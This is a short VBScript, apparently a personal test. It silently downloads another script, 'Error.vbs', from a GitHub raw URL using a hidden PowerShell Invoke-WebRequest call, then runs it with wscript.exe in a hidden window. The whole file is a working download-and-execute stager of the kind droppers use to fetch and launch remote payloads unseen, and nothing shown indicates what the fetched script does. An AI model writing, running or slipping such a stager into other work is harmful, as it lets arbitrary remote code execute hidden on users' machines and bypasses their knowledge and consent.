Option Explicit

Dim objShell, strCommand, strDownloadPath

Set objShell = CreateObject("WScript.Shell")

strDownloadPath = "C:\Users\euanl\Downloads\Download.vbs"

' Download the file
strCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/3U4NL0UBS3R/VBS_Script_Download_Test/main/Error.vbs' -OutFile '" & strDownloadPath & "'"""
objShell.Run strCommand, 0, True

' Run the downloaded file
strCommand = "wscript.exe """ & strDownloadPath & """"
objShell.Run strCommand, 0, True

Set objShell = Nothing
